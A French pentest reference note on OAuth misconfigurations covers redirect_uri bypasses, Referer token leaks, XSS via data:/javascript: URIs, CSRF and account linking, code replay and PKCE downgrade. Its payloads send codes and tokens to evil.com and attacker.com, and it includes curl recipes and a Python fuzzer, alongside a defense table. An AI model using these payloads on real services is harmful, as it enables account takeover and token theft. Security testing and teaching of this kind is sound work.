---
title: "OAuth"
type: technique
categorie: web
tags:
  - cyber
  - technique
  - web
statut: publie
---




# 🔑 OAuth — Misconfigurations

> [!info] **En 1 phrase**
> OAuth = framework d'**autorisation** où une app (le client) obtient un **token** pour accéder aux
> données d'un utilisateur chez un fournisseur (Google, GitHub, Facebook…) — mais chaque
> **mauvaise config** (`redirect_uri`, `state`, `scope`, `secret`, PKCE) permet de **voler le token**
> et de prendre le contrôle du compte (**ATO**).
>
> Source principale : **[PayloadsAllTheThings — OAuth Misconfiguration (swisskyrepo)](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/OAuth%20Misconfiguration/README.md)**

```mermaid
sequenceDiagram
    participant U as Utilisateur
    participant B as Navigateur
    participant A as App (Client)
    participant AS as Authorization Server
    participant RS as Resource Server

    U->>B: Clic "Se connecter avec X"
    B->>A: GET /login
    A->>B: 302 → /authorize?client_id=...&redirect_uri=...&scope=...&state=...
    B->>AS: GET /authorize
    AS->>U: Login + écran de consentement
    U->>AS: Autorise le client
    AS->>B: 302 → /callback?code=...&state=...
    B->>A: GET /callback?code=AUTH_CODE
    A->>AS: POST /token (code + client_secret [+ code_verifier])
    AS->>A: access_token + refresh_token
    A->>RS: GET /userinfo (Bearer)
    RS->>A: Données utilisateur
    A->>B: Session de l'app créée
```

---

## 🧭 Rappel OAuth 2.0

### Les 4 rôles

| Rôle | Qui | Rôle dans l'attaque |
|---|---|---|
| **Resource Owner** | L'utilisateur final | La victime dont on veut le compte |
| **Client** | L'app web/mobile | Parfois vulnérable (on l'attaque) |
| **Authorization Server (AS)** | Le fournisseur OAuth (Google…) | Redirige, délivre les codes/tokens |
| **Resource Server (RS)** | L'API qui expose les données | `/userinfo`, `/me`… |

### Les 3 endpoints critiques

| Endpoint | Méthode | Contexte | Utilité pour l'attaquant |
|---|---|---|---|
| `/authorize` | `GET` (navigateur) | Déclenche le flux OAuth | **On le manipule** : `redirect_uri`, `scope`, `response_type`, `state` |
| `/token` | `POST` (backend) | Échange le code contre un token | **Rejouer un code**, enlever `code_verifier` |
| `/userinfo` | `GET` (Bearer) | Retourne les infos du user | **Tester le token volé** / lire les données |

### Les tokens

| Token | Caractéristique | Si volé |
|---|---|---|
| `authorization_code` | Usage **unique**, court (30-60 s), échangé contre un token | Attaquant ↔ code → token |
| `access_token` | Autorise l'accès à l'API, expiration courte (JWT ou opaque) | Accès direct aux données |
| `refresh_token` | Longue durée, renouvelle l'access token | **Accès persistant** = ATO total |
| `id_token` (OpenID Connect) | JWT contenant l'identité | Usurpation d'identité |

### Scopes

```http
# Le scope demande QUOI accéder (moindre privilège = défense)
GET /authorize?response_type=code&client_id=CLIENT&scope=openid%20email HTTP/1.1
#                                                                    ^^^^^^^^^^^^
#                    openid (identité)  email (adresse) — mais aussi profile, admin, read:all…
```

---

## 🎭 Les flows OAuth 2.0

> [!warning] ⚠️ **À retenir pour l'exploitation** : chaque flow place le token **différemment**.
> - **Authorization Code** → token reçu **côté serveur** (via POST /token) → moins exposé.
> - **Implicit** → token dans **l'URL (fragment `#`)** → exposé au navigateur, aux logs, aux tiers.
> - **Client Credentials** → token pour **l'app elle-même**, pas pour un user.
> - **PKCE** → verrouille le code au navigateur qui l'a demandé.

| Flow | Qui reçoit le token | Risques principaux |
|---|---|---|
| **Authorization Code** | Backend de l'app | `redirect_uri` mal validé, code réutilisable, secret volé |
| **Implicit** (`response_type=token`) | Navigateur (fragment `#`) | Token dans l'URL (logs, referer, extensions), XSS |
| **Client Credentials** (`response_type=client_credentials`) | Backend de l'app | Secret / token pas lié au bon client |
| **PKCE** (`code_challenge` + `code_verifier`) | Backend de l'app | Downgrade si le AS accepte sans `code_verifier` |

```http
# Authorization Code — GET /authorize (navigateur)
GET /authorize?response_type=code&client_id=APP_ID&redirect_uri=https%3A%2F%2Fapp.com%2Fcallback&scope=openid%20email&state=aZ9xKp HTTP/1.1
Host: oauth.provider.com
```

```http
# Authorization Code — POST /token (backend, échange du code)
POST /token HTTP/1.1
Host: oauth.provider.com
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&code=AUTH_CODE&redirect_uri=https://app.com/callback&client_id=APP_ID&client_secret=SECRET
```

```json
// Réponse du AS
{
  "access_token": "eyJhbGciOiJSUzI1NiIs...",
  "token_type": "Bearer",
  "expires_in": 3600,
  "refresh_token": "dGhpcyBpcyBhIHJlZnJlc2g..."
}
```

```http
# Implicit — GET /authorize renvoie le token DANS L'URL
# → redirect_uri#access_token=eyJ...&token_type=Bearer&expires_in=3600
GET /authorize?response_type=token&client_id=APP_ID&redirect_uri=https%3A%2F%2Fapp.com%2Fcallback HTTP/1.1
Host: oauth.provider.com
```

```http
# Utilisation du token sur le Resource Server
GET /userinfo HTTP/1.1
Host: api.provider.com
Authorization: Bearer eyJhbGciOiJSUzI1NiIs...
```

---

## 🎯 Misconfigurations & Payloads

> [!tip] 💡 **L'ordre de test** (voir aussi Tips) :
> **1. `redirect_uri` → 2. `state` (CSRF) → 3. `scope` → 4. token / code → 5. PKCE**.

---

### 1️⃣ `redirect_uri` mal validé → vol du token (TOUJOURS tester en premier)

Le AS redirige le navigateur de la victime vers `redirect_uri` **avec le code/token**.
Si on peut pointer cette URI sur **notre domaine**, on reçoit le token de la victime.

> [!warning] ⚠️ **Règle** : ne JAMAIS allowlister des **domaines entiers**, seulement des **URLs complètes**.
> `redirect_uri` acceptant un wildcard (`*.example.com`) ou un domaine = token leak.

```http
# 1. Domaine 100% contrôlé
GET /signin/authorize?[...]&redirect_uri=https://evil.com/loginsuccessful HTTP/1.1
Host: www.example.com

# 2. Sous-domaine contrôlé de la cible (accepté car match *.example.com)
GET /signin/authorize?[...]&redirect_uri=https://demo.example.com/loginsuccessful HTTP/1.1
Host: www.example.com

# 3. "localhost" filtré par startsWith → localhost.evil.com passe
GET /signin/authorize?[...]&redirect_uri=https://localhost.evil.com HTTP/1.1
Host: www.example.com
```

**Chaînage avec un open redirect officiel** (l'AS autorise une URL connue qui redirige ensuite) :

```http
# Google /accounts/BackToAuthSubTarget redirige vers ?next=
GET /oauth20_authorize.srf?[...]&redirect_uri=https://accounts.google.com/BackToAuthSubTarget?next=https://evil.com HTTP/1.1
Host: www.example.com

# apps.facebook.com/<attacker> = page d'app contrôlable par l'attaquant
GET /oauth2/authorize?[...]&redirect_uri=https%3A%2F%2Fapps.facebook.com%2Fattacker%2F HTTP/1.1
Host: www.example.com
```

**Bypasser un filtre sur `redirect_uri` en cassant le scope** (le AS valide moins quand le scope est invalide) :

```http
GET /admin/oauth/authorize?[...]&scope=a&redirect_uri=https://evil.com HTTP/1.1
Host: www.example.com
```

#### Variantes de bypass du filtre `redirect_uri`

> [!warning] ⚠️ Le parsing d'URL **diffère entre le serveur et le navigateur** (le navigateur
> résout en dernier). Si le serveur valide `app.com` mais que le navigateur va sur `evil.com` → TOKEN LEAK.

| Technique | Payload `redirect_uri=` | Idée |
|---|---|---|
| Domaine contrôlé | `https://evil.com/callback` | Si pas d'allowlist du tout |
| Sous-domaine contrôlé | `https://demo.example.com/...` | Allowlist `*.example.com` |
| `startsWith` filtré | `https://localhost.evil.com` | Le filtre cherche `localhost` au début |
| Domaine suffixé | `https://app.com.evil.com` | Le filtre cherche `app.com` en substring |
| Sous-domaine de l'app | `https://evil.app.com` | Accepte `*.app.com`, un sous-domaine est compromis |
| **`@` (userinfo)** | `https://app.com@evil.com` | Serveur parse `app.com`, navigateur va sur `evil.com` |
| **Fragment `#`** | `https://app.com/callback#@evil.com` | Ce qui suit `#` est ignoré par le navigateur pour le host |
| **Port arbitraire** | `https://app.com:443@evil.com` / `https://evil.com:80/cb` | Comparaison du port différente |
| **Double encodage** | `https%3A%2F%2Fevil.com` / `https%3A%2F%2F%2F%2Fevil.com` | Normalisation décodée côté serveur uniquement |
| Encodage unicode | `https://ｅｖｉｌ.com` | Homographes / normalisation IDN |
| Path traversal | `https://app.com/callback/../../evil.com` | Le path est normalisé par le navigateur |
| Open redirect du fournisseur | `https://accounts.google.com/BackToAuthSubTarget?next=https://evil.com` | URL "connue" → rebond |
| Domaine de confiance piratable | `https%3A%2F%2Fapps.facebook.com%2Fattacker%2F` | App tierce sous un domaine allowlisté |
| **Scope invalide** | `&scope=a&redirect_uri=https://evil.com` | Certains AS désactivent la validation |
| `data:` / `javascript:` | `data:text/html,a` | Exécution de contenu (→ XSS, voir §3) |

#### Exploitation complète (account hijacking via redirect_uri)

```http
# 1. Attaquant initie le flux, intercepte et modifie redirect_uri → son domaine
GET /oauth/authorize?client_id=VICTIM_APP&redirect_uri=https://evil.com/callback&scope=email&state=... HTTP/1.1
Host: oauth.provider.com

# 2. Victime clique le lien et s'authentifie chez le fournisseur
# 3. Le fournisseur redirige la victime vers https://evil.com/callback?code=AUTH_CODE
# 4. L'attaquant échange le code contre le token :

POST /token HTTP/1.1
Host: oauth.provider.com
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&code=AUTH_CODE&redirect_uri=https://evil.com/callback&client_id=VICTIM_APP&client_secret=SECRET

# 5. L'attaquant appelle /userinfo → identité de la victime → LOGIN sur l'app = ATO complet
```

> [!tip] 💡 Vérifier aussi que le **`/token` du AS valide le `redirect_uri`** : si le endpoint
> /token accepte un `redirect_uri` différent de celui de /authorize, on peut rédéemir un code
> volé avec **notre** redirect_uri même quand /authorize était "protégé".

---

### 2️⃣ Vol du token via le **Referer**

> [!info] **Principe** : on a une **injection HTML** (sans forcément arriver à du XSS) et l'app
> laisse le token dans l'**URL** (query string du callback, flow implicite avec token dans l'URL,
> token dans une requête GET). Le navigateur de la victime envoie alors le **`Referer`** complet
> (avec le token) quand il charge une ressource externe → notre serveur.

```http
<!-- Payload injecté sur une page de la victime, côté app -->
<img src="https://attacker.com/collect" />
```

```http
# Requête reçue par l'attaquant
GET /collect HTTP/1.1
Host: attacker.com
Referer: https://example.com/oauth/callback?code=AUTH_CODE&state=...
```

> [!warning] ⚠️ Le **fragment `#` n'est PAS envoyé dans le Referer** : un token en fragment
> (flow implicite) ne fuit PAS par cette voie — mais il fuit si l'app le **recopie dans la query
> string** ou dans une requête GET suivante.

**Chaîne complète** :
1. Injection HTML (paramètre reflété, upload, fonctionnalité "avatar", titre…) → `<img src=...>`.
2. Amener la victime à se connecter / recharger la page qui contient le token dans l'URL.
3. Le navigateur charge notre image → le `Referer` porte le token → **on le capture**.

---

### 3️⃣ XSS via `redirect_uri` (`data:` / `javascript:`)

> [!info] **Principe** : si le AS accepte un schéma `data:` ou `javascript:` comme `redirect_uri`,
> la victime est redirigée vers notre contenu **avec le token dans l'URL** → exécution de code.

```http
GET /oauth/v1/authorize?[...]&redirect_uri=data%3Atext%2Fhtml%2Ca&state=<script>alert('XSS')</script> HTTP/1.1
Host: example.com
```

- `redirect_uri=data:text/html,a` → le navigateur affiche `a` — si le AS colle le token dans la
  redirection, on contrôle le contenu rendu.
- `state` reflété dans le HTML de la page de consentement ou du callback → XSS classique.
- Résultat : le script s'exécute **dans le contexte de l'app** → vol de token / session.
- Voir la note [[XSS (Cross-Site Scripting)|🖼️ XSS]].

---

### 4️⃣ Secrets faibles / secret dans le client

> [!warning] ⚠️ Le `client_secret` est l'équivalent du **mot de passe de l'app**. Il doit vivre
> **uniquement côté serveur**.

```bash
# Android : décompiler l'APK et grep les secrets
apktool d app.apk
jadx app.apk -d out/
grep -rEi "client_secret|clientsecret|secret|api_key" out/ 2>/dev/null

# iOS : strings du binaire
strings "Payload/app.app/app" | grep -i secret
```

```json
// Pattern de fuite typique
{
  "client_id": "abc123",
  "client_secret": "dGhpcy1pcy1hLXNlY3JldA=="   // base64 / en clair dans le JS de la SPA
}
```

**Si le secret est dans le JS/APK** → on peut faire tourner le flux OAuth nous-mêmes (en tant que
le client légitime) → échanger des codes volés, rejouer, exploiter d'autres défauts du AS.

> [!tip] 💡 **OAuth Private Key Disclosure** : certaines apps mobiles embarquent même la
> **clé privée** de signature du client — une simple **décompilation** (apktool / jadx / strings)
> suffit à la récupérer → on signe des requêtes/assertions au nom de l'app.

---

### 5️⃣ `state` absent / non vérifié → CSRF

> [!info] **Principe** : le paramètre `state` lie la demande d'autorisation à la session du
> navigateur (anti-CSRF du callback). S'il est **absent ou non vérifié**, le callback accepte
> n'importe quel `code` → **login CSRF** et **account linking**.

```http
# Callback vulnérable : pas de contrôle du state
GET /callback?code=AUTHORIZATION_CODE HTTP/1.1
Host: example.com
```

#### Login CSRF

1. L'attaquant initie le flux OAuth avec **son** compte fournisseur et intercepte le callback.
2. Il envoie le lien `https://example.com/callback?code=ATTACKER_CODE` à la victime (ou la force à cliquer).
3. L'app connecte **le compte fournisseur de l'attaquant** à la session de la victime.
4. La victime croit avoir "ses" données, mais c'est le compte de l'attaquant → si la victime y dépose
   des infos, l'attaquant les lit. Et inversement, si l'app associe mal, l'attaquant **hérite du compte** (ATO).

> [!warning] ⚠️ La défense officielle du RFC : le `state` doit être **généré par requête** et
> **vérifié dans le callback**. Un state fixe / réutilisé / absent = vulnérable.

```http
# Requête OAuth CORRECTE (state unique, non prédictible, lié à la session)
GET /authorize?response_type=code&client_id=APP&redirect_uri=https://app.com/callback&scope=openid&state=UNIQUE_ALEATOIRE HTTP/1.1
Host: oauth.provider.com
```

---

### 6️⃣ Scope escalation

> [!info] **Principe** : l'app demande `scope=openid` mais le AS n'est pas censé donner plus.
> Si on **modifie le scope** dans /authorize (ou dans une demande de consentement rejouée), le AS
> peut accorder des droits **plus larges** (admin, `read:all`, données perso…) → vol de données.

```http
# Avant / après — l'app exige email, on demande TOUT
GET /authorize?response_type=code&client_id=APP&redirect_uri=https://app.com/callback&scope=email HTTP/1.1
GET /authorize?response_type=code&client_id=APP&redirect_uri=https://app.com/callback&scope=email%20profile%20read:all%20admin HTTP/1.1
Host: oauth.provider.com
```

```http
# SPA : le scope est parfois ré-utilisé à l'échange du code
POST /token HTTP/1.1
Host: oauth.provider.com
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&code=CODE&redirect_uri=https://app.com/callback&client_id=APP&scope=email+admin
```

> [!warning] ⚠️ Vérifier **quelle donnée revient réellement dans `/userinfo`** selon le scope demandé,
> et si l'**access token** porte plus de droits que le scope de l'app. Un token "pas lié au client"
> (aucune `aud`/`client_id` vérifié) peut être utilisé ailleurs.

---

### 7️⃣ Authorization Code Rule Violation (code réutilisable)

> RFC 6749 §4.1.2 : *« The client MUST NOT use the authorization code more than once. If an
> authorization code is used more than once, the authorization server MUST deny the request and
> SHOULD revoke all tokens previously issued based on that authorization code »*.

```http
# Rejouer le même code
POST /token HTTP/1.1
Host: oauth.provider.com
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&code=AUTH_CODE&redirect_uri=https://app.com/callback&client_id=APP&client_secret=SECRET

# 2ème rejeu du même code → devrait être refusé, certains AS le délivrent encore
```

> [!tip] 💡 Un code à usage **multiple** permet de délivrer des tokens **à nous et à l'app** à
> partir du même code volé → persistance. Combiner avec un secret compromis (§4) ou un `redirect_uri`
> non vérifié au /token (§1).

---

### 8️⃣ Account linking / "Connect another account"

> [!info] **Principe** : l'app propose de lier un compte social à un compte local, ou de fusionner
> deux identités. Si le linking ne **re-vérifie pas** que l'utilisateur authentifié est bien celui
> qui possède le `code`, on peut **lier notre compte fournisseur au compte de la victime** → ATO.

```http
# Endpoint de linking vulnérable : le code est utilisé sans vérification d'appartenance
POST /oauth/link HTTP/1.1
Host: app.com
Content-Type: application/x-www-form-urlencoded

provider=google&code=ATTACKER_CODE
```

**Chaîne d'attaque (Forced OAuth profile linking — PortSwigger lab) :**
1. Victime connectée sur l'app via OAuth (ex: son GitHub).
2. L'attaquant initie un flux "se connecter / relier" avec **son propre compte fournisseur**, intercepte le callback.
3. Il force la victime à visiter `https://app.com/oauth/link?code=ATTACKER_CODE` (CSRF, pas de state).
4. L'app lie **le compte fournisseur de l'attaquant** au **compte local de la victime**.
5. L'attaquant se reconnecte via son compte fournisseur → il accède au compte de la victime = **ATO**.

> [!tip] 💡 Même protection que le login CSRF : `state` + vérifier que le code appartient à la
> **session authentifiée** courante avant de lier.

---

### 9️⃣ PKCE absent / downgrade

> [!info] **Principe** : PKCE (`code_challenge` + `code_verifier`) prouve que le code est échangé par
> le **même navigateur** qui l'a demandé. Sans PKCE (ou si le AS l'accepte **en option**), un code
> intercepté peut être échangé par **n'importe qui**.

```http
# GET /authorize correct (PKCE S256)
GET /authorize?response_type=code&client_id=APP&redirect_uri=https://app.com/callback&code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM&code_challenge_method=S256 HTTP/1.1
Host: oauth.provider.com
```

```http
# Downgrade : échange SANS code_verifier → si le AS répond un token, PKCE est contournable
POST /token HTTP/1.1
Host: oauth.provider.com
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&code=CODE&client_id=APP&redirect_uri=https://app.com/callback&client_secret=SECRET

#  → 200 OK avec access_token = DOWNGRADE RÉUSSI (PKCE optionnel)
#  → 400 invalid_grant = le AS exige bien le verifier (bonne défense)
```

```http
# Ou : retirer le code_verifier de la requête du client (l'app oublie de le vérifier côté AS)
```

> [!tip] 💡 L'attaquant doit d'abord **voler le code** (redirect_uri §1, referer §2, XSS §3).
> PKCE n'empêche pas le vol du code : il empêche que le code volé soit **réutilisable** par l'attaquant.

---

### 🔟 `response_type` confusion

> [!info] **Principe** : le AS doit refuser les `response_type` non enregistrés pour le client.
> Manipuler `response_type` peut changer **où et comment** le token revient (query vs fragment).

```http
# L'app attend un code (authorization code)…
GET /authorize?response_type=code&client_id=APP&redirect_uri=https://app.com/callback HTTP/1.1

# …mais on demande un token direct (implicit) → token dans le fragment
GET /authorize?response_type=token&client_id=APP&redirect_uri=https://app.com/callback HTTP/1.1

# Formes abusives : token code token_code id_token code id_token token…
GET /authorize?response_type=token%20code&client_id=APP&redirect_uri=... HTTP/1.1
GET /authorize?response_type=id_token%20token&client_id=APP&redirect_uri=... HTTP/1.1
```

- Objectif : obtenir un **token directement** (contourner la protection du code), ou
  **casser le parsing** du callback (l'app lit `code` dans la query, le token arrive en fragment → confusion).

---

## 🚀 Escalades classiques

| Vecteur initial | Chaîne | Résultat |
|---|---|---|
| `redirect_uri` → token | Vol code → échange → `/userinfo` | **ATO complet** |
| Account linking sans state | Lier compte attaquant au compte victime → login attaquant | **ATO complet** |
| Login CSRF | Forcer le callback attaquant dans la session victime | Compte lié à l'attaquant → hijack |
| Token dans referer | Capture du code/token → échange ou usage direct | **Session hijacking** |
| XSS via `redirect_uri` | `data:`/`javascript:` → vol token dans le contexte de l'app | ATO + persistance |
| Code réutilisable + secret | Rejeu du code avec `client_secret` de l'app | Tokens multiples (persistance) |

### ATO via linking — récap opérationnel

```bash
# 1. Récupérer un code valide pour le COMPTE DE L'ATTAQUANT
curl -i "https://oauth.provider.com/authorize?client_id=APP&redirect_uri=https://app.com/oauth/link&response_type=code&scope=openid"
# 2. S'authentifier avec le compte attaquant chez le provider, récupérer le code du callback
# 3. Forcer la victime à cliquer (CSRF) :
curl -i "https://app.com/oauth/link?code=ATTACKER_CODE"
# 4. Victime = désormais liée au compte fournisseur de l'attaquant
# 5. L'attaquant se connecte avec son fournisseur → compte victime
```

### Session hijacking — récap opérationnel

```bash
# 1. Voler le code/token (redirect_uri, referer, XSS…)
# 2. Échanger le code si besoin :
curl -X POST "https://oauth.provider.com/token" \
  -d "grant_type=authorization_code&code=VOLU&client_id=APP&client_secret=SECRET&redirect_uri=https://evil.com/callback"
# 3. Valider le token sur l'app :
curl -i "https://app.com/callback" -H "Cookie: session=..." # ou directement l'API
curl "https://api.provider.com/userinfo" -H "Authorization: Bearer $TOKEN"   # lire les données
```

---

## 🛠️ Outils & Fuzzing

| Outil | Usage |
|---|---|
| **Burp Suite (Proxy + Repeater)** | Intercepter le flux OAuth complet, modifier `redirect_uri` / `scope` / `state` / `response_type`, retirer `code_verifier` |
| **Burp — OAuth Scan (extension officielle PortSwigger)** | Test automatique des misconfigurations du flux OAuth |
| **ffuf** | Fuzzer le `redirect_uri` avec des variants de bypass |
| **Scripts custom** | Boucler sur les variantes de parsing (voir ci-dessous) |
| **apktool / jadx / strings** | Extraire `client_secret` / clé privée des apps mobiles (§4) |

```bash
# Fuzzing redirect_uri avec ffuf (dictionnaire de variants de bypass)
ffuf -u "https://app.com/oauth/authorize?client_id=APP&response_type=code&scope=openid&redirect_uri=FUZZ" \
     -w redirect_uri_bypass.txt -mc 302 -fr "invalid_grant|error"
```

```py
# Fuzzing des variantes de parsing redirect_uri
import requests, urllib.parse

BASE = "https://app.com/oauth/authorize?client_id=APP&response_type=code&scope=openid&state=1"
TARGET = "https://app.com/callback"

payloads = [
    TARGET,                                # baseline (valide)
    TARGET + "/",
    TARGET + "%2f%2fevil.com",
    TARGET + "#@evil.com",
    "https://app.com@evil.com",
    "https://app.com.evil.com",
    "https://localhost.evil.com",
    "https://evil.app.com",
    "https://app.com:443@evil.com",
    "https://evil.com",
    "data:text/html,a",
    "javascript:alert(1)",
]
for p in payloads:
    r = requests.get(BASE + "&redirect_uri=" + urllib.parse.quote(p), allow_redirects=False)
    loc = r.headers.get("Location", "")
    print(f"{r.status_code}  {p[:45]:<45} → {loc[:70]}")
```

```bash
# Tester le rejeu de code (Authorization Code Rule Violation)
for i in 1 2 3; do
  curl -s -o /dev/null -w "tentative $i → %{http_code}\n" \
    -X POST "https://oauth.provider.com/token" \
    -d "grant_type=authorization_code&code=AUTH_CODE&client_id=APP&client_secret=SECRET&redirect_uri=https://app.com/callback"
done
```

```bash
# Tester le downgrade PKCE (échange sans code_verifier)
curl -s -X POST "https://oauth.provider.com/token" \
  -d "grant_type=authorization_code&code=AUTH_CODE&client_id=APP&client_secret=SECRET&redirect_uri=https://app.com/callback" \
  | head -c 300
# 200 OK + access_token → PKCE contournable
# invalid_grant → AS correct
```

---

## 🔍 Détection & Défense

| Risque | Défense |
|---|---|
| `redirect_uri` arbitraire | **Allowlist d'URLs COMPLÈTES** (schéma+host+port+path exacts), jamais de domaine entier ni wildcard ; le AS doit valider AUSSI au `/token` |
| Bypass de parsing | Valider avec un parseur **RFC 3986** et comparer l'URL **canonique** ; pas de `startsWith`/`contains` |
| CSRF / linking / login CSRF | `state` **aléatoire, unique, lié à la session**, vérifié dans le callback ; re-vérifier que le code appartient à la session |
| Secret dans le client | `client_secret` **côté serveur uniquement** ; jamais dans JS, APK, repos ; rotation régulière |
| Scope escalation | **Moindre privilège** côté app ; le AS n'accorde que les scopes enregistrés du client ; vérifier le scope effectif retourné |
| Token pas lié au client | Vérifier `aud`/`iss`/`client_id` du token ; audience correcte, expiration, pas de rejeu |
| Code réutilisable | **Usage unique** + expiration courte (30-60 s) + lié au client ET au `redirect_uri` ; révoquer tout à la 2e utilisation |
| PKCE absent/downgrade | **Forcer PKCE S256** ; refuser tout échange sans `code_verifier` |
| Token dans referer | `Referrer-Policy: no-referrer` / `strict-origin` ; token **jamais dans la query string** (fragment pour le flow front) |
| Implicit flow | **Bannir** le flow implicite (token dans l'URL) → authorization code + PKCE |
| Fuite mobile | Obfuscation + keystore pour les secrets ; ne pas embarquer la clé privée |
| Monitoring | Logs : redirects hors allowlist, multi-usage de codes, linking inhabituel, requêtes `/userinfo` répétées |

---

## ⚠️ Tips & Pièges

> [!tip] 💡 **Ordre de test** (efficace et logique)
> 1. **`redirect_uri`** — le plus rentable : un bypass = token = ATO. Teste toutes les variantes de parsing.
> 2. **`state`** — retire-le / fixe-le → CSRF, login CSRF, linking.
> 3. **`scope`** — modifie-le → escalation de données.
> 4. **token / code** — rejeu du code, token dans referer, échange sans PKCE, usage sans vérif `aud`.
> 5. **Autres** : secret mobile, `response_type`, découverte OIDC (`/.well-known/openid-configuration`).

> [!warning] ⚠️ **Pièges des wildcards / allowlists**
> - `*.example.com` inclut des sous-domaines **contrôlés par d'autres** (`demo.example.com`, `dev.example.com`…).
> - `contains("example.com")` est bypassé par `example.com.evil.com` et `example.com@evil.com`.
> - `startsWith("https://localhost")` est bypassé par `https://localhost.evil.com`.
> - Le parseur du **serveur** et celui du **navigateur** peuvent diverger (`@`, `#`, encodage, port) → c'est ça qui donne le bypass.
> - Le `redirect_uri` doit être validé **dans /authorize ET dans /token**.

> [!warning] ⚠️ **Différences entre les flows (impact sur le test)**
> - **Authorization Code** : le token est côté serveur → le vol passe par le **code** (redirect_uri, referer, CSRF, secret).
> - **Implicit** : le token est **dans l'URL** → fuites via referer, logs, history, extensions, `data:`/`javascript:` redirect.
> - **PKCE** ne protège PAS du vol du code, il protège de son **réusage** par l'attaquant.
> - **Client Credentials** : pas de user → si l'API renvoie des données user avec un tel token, c'est un bug.
> - Un **refresh_token** volé = accès long terme : priorité au vol de refresh si visible dans le callback/stockage.

> [!tip] 💡 **Petites vérifications qui rapportent**
> - Le `client_secret` est-il dans le **JS de la SPA** ou dans l'**APK** ? → §4.
> - Le `/userinfo` accepte-t-il un token d'une **autre app** (aud non vérifiée) ?
> - Le callback accepte-t-il le token **sans contrôle `state`** même quand le `state` est fourni au /authorize ?
> - Un compte social déjà lié peut-il être **dé-lié / re-lié** sans re-auth (base du linking attack) ?

---

## 🔗 Liens

- [[Attaques JWT|🔏 JWT]] — analyser/forger les access tokens (JWT)
- [[Open Redirect|↩️ Open Redirect]] — chaînage classique du `redirect_uri`
- [[Account Takeover|👤 ATO]] — objectif final de toutes ces chaînes
- [[XSS (Cross-Site Scripting)|🖼️ XSS]] — XSS via `redirect_uri` et vol de token
- → Note complète : [[03 - Exploitation Web|🌍 Exploitation Web]]
- 📚 Source : [PayloadsAllTheThings — OAuth Misconfiguration](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/OAuth%20Misconfiguration/README.md)
- 🔬 Labs PortSwigger : [OAuth — Web Security Academy](https://portswigger.net/web-security/oauth)
